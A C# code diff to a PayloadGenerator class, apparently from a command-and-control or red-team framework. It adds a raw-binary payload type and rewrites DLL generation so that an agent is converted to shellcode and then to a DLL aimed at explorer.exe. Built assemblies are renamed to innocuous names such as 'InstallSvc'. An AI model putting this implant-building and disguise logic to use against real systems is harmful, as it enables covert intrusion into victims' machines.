@@ -20,6 +20,7 @@ public partial class PayloadGenerator
     public const string StarterSrcFile = "Starter.exe";
     public const string ServiceSrcFile = "Service.exe";
     public const string PatcherSrcFile = "PatcherDll.dll";
+    public const string LibrarySrcFile = "Library.dll";
 
     public const string NimExecScript = "Payload";
 
@@ -52,8 +53,9 @@ public partial class PayloadGenerator
         {
             case PayloadType.Executable: return this.GenerateExecutable(options, agentbytes);
             case PayloadType.PowerShell: return this.GeneratePowershell(options, agentbytes);
-            case PayloadType.Library: return this.GenerateLibrary(options, agentbytes);
+            case PayloadType.Library: return this.GenerateLibrary(options,agentbytes);
             case PayloadType.Service: return agentbytes;
+            case PayloadType.Binary: return this.GenerateBinary(options, agentbytes);
             default:
                 throw new NotImplementedException();
 
@@ -119,43 +121,19 @@ public partial class PayloadGenerator
         return bytes;
     }
 
-    public byte[] GenerateLibrary(PayloadGenerationOptions options, byte[] agent)
+    public byte[] GenerateBinary(PayloadGenerationOptions options, byte[] agent)
     {
         string nimSourceCode = string.Empty;
-        string agentb64 = Convert.ToBase64String(agent);
-        using (var nimReader = new StreamReader(this.Source("payload-dll.nim", options.Architecture)))
-        {
-            nimSourceCode = nimReader.ReadToEnd();
-        }
 
-        var payload = new StringBuilder();
-        foreach (var chunk in this.SplitIntoChunks(agentb64, 1000))
-        {
-            payload.Append("  b64 = b64 & \"");
-            payload.Append(chunk);
-            payload.Append("\"");
-            payload.Append(Environment.NewLine);
-        }
+        var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
+        var tmpPath = this.Working(tmpFile);
+        File.WriteAllBytes(tmpPath, agent);
 
-        var nimFile = "tmp" + ShortGuid.NewGuid() + ".nim";
-        nimSourceCode = nimSourceCode.Replace("[[PAYLOAD]]", payload.ToString());
-
-        var nimPath = this.Working(nimFile);
-        using (var writer = new StreamWriter(nimPath))
-        {
-            writer.WriteLine(nimSourceCode);
-        }
-
-        var outFile = "tmp" + ShortGuid.NewGuid() + ".dll";
+        var outFile = "tmp" + ShortGuid.NewGuid() + ".bin";
         var outPath = this.Working(outFile);
 
-        var parms = this.ComputeNimBuildParameters(nimPath, outPath, options.Architecture == PayloadArchitecture.x86, options.IsDebug, true);
-
-        this.MessageSent?.Invoke(this, $"[>] Generating library...");
-
-        if (options.IsVerbose)
-            this.MessageSent?.Invoke(this, $"[>] Executing: nim {string.Join(" ", parms)}");
-        var executionResult = this.NimBuild(parms);
+        this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
+        var executionResult = this.GenerateBin(tmpPath, outPath, options.Architecture == PayloadArchitecture.x86);
 
         if (options.IsVerbose)
             this.MessageSent?.Invoke(this, executionResult.Out);
@@ -173,7 +151,67 @@ public partial class PayloadGenerator
             File.Delete(outPath);
         }
 
-        File.Delete(nimPath);
+        File.Delete(tmpPath);
+
+        return bytes;
+    }
+
+    public byte[] GenerateLibrary(PayloadGenerationOptions options, byte[] agent)
+    {
+        string nimSourceCode = string.Empty;
+
+        var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
+        var tmpPath = this.Working(tmpFile);
+        File.WriteAllBytes(tmpPath, agent);
+
+        var outFile = "tmp" + ShortGuid.NewGuid() + ".bin";
+        var outPath = this.Working(outFile);
+
+        this.MessageSent?.Invoke(this, $"[>] Generating Library...");
+        if (options.IsVerbose)
+            this.MessageSent?.Invoke(this, $"Generating Binary...");
+        var executionResult = this.GenerateBin(tmpPath, outPath, options.Architecture == PayloadArchitecture.x86);
+
+        if (options.IsVerbose)
+            this.MessageSent?.Invoke(this, executionResult.Out);
+
+        File.Delete(tmpPath);
+
+        if (options.IsVerbose)
+            if (executionResult.Result == 0)
+                this.MessageSent?.Invoke(this, "Binary generated.");
+            else
+            {
+                this.MessageSent?.Invoke(this, "Generation failed.");
+                return null;
+            }
+
+
+        if (options.IsVerbose)
+            this.MessageSent?.Invoke(this, $"Generating dll...");
+        var dllFile = "tmp" + ShortGuid.NewGuid() + ".dll";
+        var dllPath = this.Working(dllFile);
+
+        var executionResultDll = this.GenerateDll(outPath, dllPath, "explorer.exe");
+
+        File.Delete(outPath);
+
+        if (options.IsVerbose)
+            this.MessageSent?.Invoke(this, executionResultDll.Out);
+        if (options.IsVerbose)
+            if (executionResultDll.Result == 0)
+                this.MessageSent?.Invoke(this, "Dll generated.");
+            else
+            {
+                this.MessageSent?.Invoke(this, "Generation failed.");
+                return null;
+            }
+
+        byte[] bytes = null;
+
+
+        bytes = File.ReadAllBytes(dllPath);
+        File.Delete(dllPath);
 
         return bytes;
     }
@@ -206,7 +244,7 @@ public partial class PayloadGenerator
         }
 
         byte[] bytes = File.ReadAllBytes(psPath);
-  
+
 
         File.Delete(Path.Combine(this.Config.WorkingFolder, psPath));
 
@@ -267,7 +305,7 @@ public partial class PayloadGenerator
             var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
             return resultAgent;
         }
-        else
+        if (options.Type == PayloadType.Service)
         {
             this.MessageSent?.Invoke(this, $"Creating Starter...");
             //Create Starter
@@ -280,6 +318,22 @@ public partial class PayloadGenerator
             var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
             return resultAgent;
         }
+
+        //if(options.Type == PayloadType.Library)
+        //{
+        //    this.MessageSent?.Invoke(this, $"Creating Starter...");
+        //    //Create Starter
+        //    var library = LoadAssembly(this.Source(LibrarySrcFile, options.Architecture));
+        //    library = AssemblyEditor.ReplaceRessources(library, new Dictionary<string, object>()
+        //            {
+        //                { "Payload", Encoding.UTF8.GetBytes(patcherb64) },
+        //                { "Key", encPatcher.Secret }
+        //            });
+        //    var resultAgent = AssemblyEditor.ChangeName(library, "InstallLibrary");
+        //    return resultAgent;
+        //}
+
+        return null;
     }
 
     private byte[] LoadAssembly(string filePath)
